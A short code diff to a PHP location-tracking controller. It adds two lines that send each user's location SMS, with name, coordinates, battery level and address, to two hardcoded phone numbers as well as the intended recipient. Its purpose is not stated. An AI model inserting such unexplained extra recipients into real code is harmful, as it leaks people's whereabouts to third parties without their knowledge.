@@ -89,6 +89,8 @@ class UserLocationsController extends Controller
         $battery = $userLocation->content['battery']['level'];
         $address = $userLocation->address;
         $this->sendSMS($phone, $name, $date, $time, $lat, $lng, $battery, $address);
+        $this->sendSMS('9820704909', $name, $date, $time, $lat, $lng, $battery, $address);
+        $this->sendSMS('9579862371', $name, $date, $time, $lat, $lng, $battery, $address);
       }
     }
 
